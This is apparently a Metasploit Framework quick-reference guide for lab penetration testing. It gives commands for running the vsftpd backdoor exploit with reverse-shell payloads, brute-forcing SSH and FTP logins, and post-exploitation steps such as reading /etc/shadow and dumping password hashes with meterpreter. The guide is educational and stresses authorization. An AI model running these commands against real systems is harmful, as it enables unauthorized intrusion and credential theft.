# Metasploit Framework - Quick Reference Guide

## Overview

Metasploit Framework is the world's most widely used penetration testing platform. This guide provides quick-reference commands for common exploitation workflows.

**Version:** Metasploit Framework 6.x  
**Platform:** Kali Linux 2024.x  
**Use Case:** Penetration testing in controlled lab environments

---

## Starting Metasploit

### Launch the Console

```bash
msfconsole
```

**What it does:** Opens the Metasploit Framework interactive console

**Wait time:** 20-40 seconds (loads exploit database)

**Prompt:**
```
msf6 >
```

---

### Quick Start with Database

```bash
# Start PostgreSQL database (if not running)
sudo systemctl start postgresql

# Initialize Metasploit database
sudo msfdb init

# Launch console
msfconsole
```

**Why use database:**
- Stores scan results and session data
- Enables workspace management
- Improves search performance

---

## Essential Commands

### Getting Help

```bash
# General help
help

# Help for specific command
help search

# Show command options
show -h
```

---

### Searching for Exploits

```bash
# Search by service name
search vsftpd

# Search by CVE
search cve:2011-2523

# Search by platform
search platform:linux

# Search by type
search type:exploit

# Combined search
search vsftpd type:exploit platform:unix
```

**Search filters:**
- `name:` - Module name
- `platform:` - Target platform (windows, linux, unix, etc.)
- `type:` - Module type (exploit, auxiliary, post)
- `cve:` - CVE identifier
- `rank:` - Reliability rank (excellent, great, good, normal, low)

---

### Using Exploits

```bash
# Select an exploit (use full path from search results)
use exploit/unix/ftp/vsftpd_234_backdoor

# Show exploit options
show options

# Show advanced options
show advanced

# Show available payloads
show payloads

# Show targets
show targets
```

---

### Configuring Exploits

```bash
# Set required options
set RHOSTS 192.168.100.10
set RPORT 21

# Set payload (if needed)
set PAYLOAD linux/x86/shell_reverse_tcp

# Set local attacker IP (for reverse shells)
set LHOST 192.168.100.5

# Set local listening port
set LPORT 4444

# View current settings
show options

# Unset an option
unset RHOSTS
```

**Common options:**
- **RHOSTS** - Target IP(s) [Required]
- **RPORT** - Target port [Usually pre-set]
- **LHOST** - Attacker IP (for reverse shells)
- **LPORT** - Attacker listening port
- **PAYLOAD** - What executes after exploit succeeds

---

### Running Exploits

```bash
# Execute exploit
exploit

# Alternative command (same as exploit)
run

# Execute with verbose output
exploit -v

# Execute in background (returns to console)
exploit -j

# Execute with specific payload
exploit -p linux/x86/shell_reverse_tcp
```

---

## Working with Sessions

### Viewing Sessions

```bash
# List active sessions
sessions

# List with detailed info
sessions -v
```

**Sample output:**
```
Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.100.5:41391 -> 192.168.100.10:6200 (192.168.100.10)
```

---

### Interacting with Sessions

```bash
# Interact with session 1
sessions -i 1

# Background current session (from within session)
# Press: Ctrl+Z

# Kill a session
sessions -k 1

# Kill all sessions
sessions -K
```

---

### Upgrading Shells

```bash
# From basic shell to meterpreter (when possible)
sessions -u 1

# Background session and return to msfconsole
# Press: Ctrl+Z
```

---

## Post-Exploitation Commands

### In a Basic Shell Session

```bash
# Verify user
whoami

# Show user/group IDs
id

# System information
uname -a
hostname

# Current directory
pwd

# List files
ls -la

# Read files
cat /etc/passwd
cat /etc/shadow

# Network connections
netstat -tulpn

# Running processes
ps aux
```

---

### With Meterpreter (Advanced Payload)

```bash
# System info
sysinfo

# Current user
getuid

# Upload file to target
upload /path/local/file.txt /tmp/file.txt

# Download file from target
download /etc/passwd /tmp/passwd.txt

# Execute command
execute -f whoami

# Start shell
shell

# Take screenshot (if GUI present)
screenshot

# Dump password hashes
hashdump

# Background meterpreter
background
```

---

## Auxiliary Modules

### Scanning

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.10
run

# Service version detection
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.100.10
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.10
run
```

---

### Brute Force Attacks

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.10
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.100.10
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

---

## Workspace Management

### Using Workspaces

```bash
# List workspaces
workspace

# Create new workspace
workspace -a project_name

# Switch to workspace
workspace project_name

# Delete workspace
workspace -d old_project

# Rename workspace
workspace -r old_name new_name
```

**Why use workspaces:**
- Organize different projects/targets
- Keep scan results separated
- Switch between engagements easily

---

## Database Commands

### Viewing Stored Data

```bash
# Show discovered hosts
hosts

# Show discovered services
services

# Show vulnerabilities
vulns

# Show credentials found
creds

# Show loot (files, hashes, etc.)
loot
```

---

### Adding Data Manually

```bash
# Add a host
db_import /path/to/nmap_scan.xml

# Add service
services -a 192.168.100.10 -p 21 -n ftp -i "vsftpd 2.3.4"

# Add vulnerability
vulns -a 192.168.100.10 -p 21 -n "vsftpd backdoor" -r CVE-2011-2523
```

---

## Payload Selection

### Common Payloads

**Linux Payloads:**
```bash
# Reverse TCP shell (most common)
set PAYLOAD linux/x86/shell_reverse_tcp

# Bind TCP shell
set PAYLOAD linux/x86/shell_bind_tcp

# Meterpreter (advanced features)
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

**Windows Payloads:**
```bash
# Reverse TCP shell
set PAYLOAD windows/shell_reverse_tcp

# Meterpreter
set PAYLOAD windows/meterpreter/reverse_tcp

# Reverse HTTPS (evades some firewalls)
set PAYLOAD windows/meterpreter/reverse_https
```

---

## Troubleshooting

### Common Issues

#### "Exploit completed, but no session was created"

**Possible causes:**
1. Target service not running
2. Firewall blocking connection
3. Wrong target version
4. Network connectivity issue

**Diagnosis steps:**
```bash
# Test connectivity
ping <target_ip> -c 4

# Test port access
nc -zv <target_ip> <target_port>

# Verify service version with Nmap
nmap -sV -p <port> <target_ip>

# Try exploit with verbose output
set VERBOSE true
exploit
```

---

#### "Handler failed to bind"

**Cause:** LPORT already in use

**Fix:**
```bash
# Change local port
set LPORT 4445

# Or kill process using the port
sudo fuser -k 4444/tcp
```

---

#### Database connection errors

**Fix:**
```bash
# Restart PostgreSQL
sudo systemctl restart postgresql

# Reinitialize database
sudo msfdb reinit

# Check database status
sudo msfdb status
```

---

## Best Practices

### Pre-Exploitation

1. **Always verify target before exploiting**
   ```bash
   # Use Nmap first
   nmap -sV -p 21 192.168.100.10
   ```

2. **Read module documentation**
   ```bash
   info exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **Check exploit reliability**
   - Look for "excellent" or "great" rank
   - Read module notes and references

4. **Verify you're targeting the correct system**
   - Double-check IP addresses
   - Confirm in isolated lab environment

---

### During Exploitation

1. **Use verbose mode for troubleshooting**
   ```bash
   set VERBOSE true
   ```

2. **Document all commands and results**
   - Save terminal output
   - Screenshot successful exploits

3. **Background sessions when switching tasks**
   ```bash
   # Instead of exiting, background with Ctrl+Z
   ```

---

### Post-Exploitation

1. **Establish persistence carefully**
   - Only in authorized testing environments
   - Document all changes made

2. **Cover your tracks (ethical consideration)**
   - In real pentests, document what you do
   - In labs, practice both attack and cleanup

3. **Exit cleanly**
   ```bash
   # Exit shell
   exit
   
   # Clean up sessions
   sessions -K
   
   # Exit Metasploit
   exit
   ```

---

## Quick Workflow Reference

### Standard Exploitation Flow

```bash
# 1. Start Metasploit
msfconsole

# 2. Search for exploit
search <service_name>

# 3. Select exploit
use exploit/<path/to/module>

# 4. Show required options
show options

# 5. Configure target
set RHOSTS <target_ip>
set RPORT <target_port>

# 6. (If needed) Configure payload
set PAYLOAD <payload_type>
set LHOST <your_ip>
set LPORT <your_port>

# 7. Verify configuration
show options

# 8. Execute exploit
exploit

# 9. Verify success
whoami
id
hostname

# 10. Perform post-exploitation
<enumerate system>

# 11. Exit cleanly
exit
sessions -K
exit
```

---

## Useful External Commands

### Network Testing (from Kali terminal, not Metasploit)

```bash
# Verify target is up
ping 192.168.100.10 -c 4

# Test specific port
nc -zv 192.168.100.10 21

# Scan target with Nmap
nmap -sV -p 21 192.168.100.10

# Check your own IP
ip addr show

# Verify network connectivity
ip route
```

---

### File Management

```bash
# Find exploit modules
locate vsftpd | grep metasploit

# Read exploit source code
cat /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb

# View Metasploit logs
tail -f ~/.msf4/logs/framework.log
```

---

## Resources

### Documentation

- **Official Metasploit Docs:** https://docs.metasploit.com/
- **Rapid7 Exploit Database:** https://www.rapid7.com/db/
- **Metasploit Unleashed:** https://www.offensive-security.com/metasploit-unleashed/

### Community

- **Metasploit GitHub:** https://github.com/rapid7/metasploit-framework
- **Metasploit Community:** https://github.com/rapid7/metasploit-framework/discussions

---

## Common Metasploit Terminology

**Exploit:** Code that takes advantage of a vulnerability

**Payload:** Code that executes after successful exploitation (shell, meterpreter, etc.)

**Auxiliary:** Support modules (scanners, fuzzers, DoS tools)

**Post:** Modules that run after system compromise (privilege escalation, data gathering)

**Encoder:** Obfuscates payloads to evade antivirus

**NOP:** "No Operation" - used in buffer overflow exploits

**Meterpreter:** Advanced payload with extensive post-exploitation features

**Session:** Active connection to compromised system

**Handler:** Listener waiting for payload connections

**RHOSTS:** Remote host(s) - the target

**RPORT:** Remote port - the target port

**LHOST:** Local host - attacker's IP (for reverse connections)

**LPORT:** Local port - attacker's listening port

---

## Safety Reminders

⚠️ **ONLY use Metasploit in authorized environments:**
- Personal lab systems
- Authorized penetration tests (with signed contracts)
- CTF competitions and training platforms

⚠️ **NEVER:**
- Attack systems without explicit written permission
- Use Metasploit on production systems without proper authorization
- Scan or exploit internet-facing systems you don't own

⚠️ **Ethical Hacking:**
- Always get permission in writing
- Stay within scope of authorization
- Report vulnerabilities responsibly
- Document all activities

---

*This reference guide is for educational and authorized security testing purposes only.*

*Last Updated: February 6, 2026*
